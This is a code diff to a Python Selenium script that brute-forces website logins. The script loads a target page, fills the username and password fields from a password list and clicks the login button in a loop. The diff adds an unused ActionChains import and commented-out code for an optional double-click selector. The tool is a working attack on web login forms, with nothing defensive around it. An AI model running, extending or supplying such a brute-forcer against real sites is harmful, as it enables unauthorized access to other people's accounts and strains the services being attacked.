@@ -9,6 +9,7 @@ from sys import stdout
 from selenium import webdriver
 from optparse import OptionParser
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.action_chains import ActionChains
 from selenium.common.exceptions import NoSuchElementException
 
 
@@ -34,6 +35,7 @@ now = datetime.datetime.now()
 
 #Args
 #parser.add_option("-u", "--username", dest="username",help="Choose the username")
+#parser.add_option("--doublesel", dest="doublesel",help="Choose the double click selector")
 parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
 parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
 parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
@@ -67,15 +69,18 @@ def wizard():
         print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
         exit()
 
+    #double_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the double click selector: ')
     username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
     password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
     login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
     #username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
     pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     #brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+    #brutes(double_selector, username_selector ,password_selector,login_btn_selector,pass_list, website)
     brutes(username_selector ,password_selector,login_btn_selector,pass_list, website)
 
 #def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
+#def brutes(double_selector, username_selector ,password_selector,login_btn_selector,pass_list, website):
 def brutes(username_selector ,password_selector,login_btn_selector,pass_list, website):
     f = open(pass_list, 'r')
     driver = webdriver.Chrome(CHROME_DVR_DIR)
@@ -90,6 +95,9 @@ def brutes(username_selector ,password_selector,login_btn_selector,pass_list, we
                 for line in f:
                     browser.get(website)
                     t.sleep(2)
+                    #Sel_double = browser.find_element_by_css_selector(double_selector) #Finds Selector
+                    #actionChains = ActionChains(browser)
+                    #actionChains.double_click(Sel_double).perform()
                     Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                     Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                     enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
@@ -131,6 +139,7 @@ optionss.add_argument("--disable-extensions")
 count = 1 #count
 
 #if options.username == None:
+#if options.doubleesel == None:
 if options.usernamesel == None:
     if options.passsel == None:
         if options.loginsel == None:
@@ -140,6 +149,7 @@ if options.usernamesel == None:
 
 
 #username = options.username
+#double_selector = options.doublesel
 username_selector = options.usernamesel
 password_selector = options.passsel
 login_btn_selector = options.loginsel
@@ -147,4 +157,5 @@ website = options.website
 pass_list = options.passlist
 print banner
 #brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+#brutes(double_selector, username_selector ,password_selector,login_btn_selector,pass_list, website)
 brutes(username_selector ,password_selector,login_btn_selector,pass_list, website)
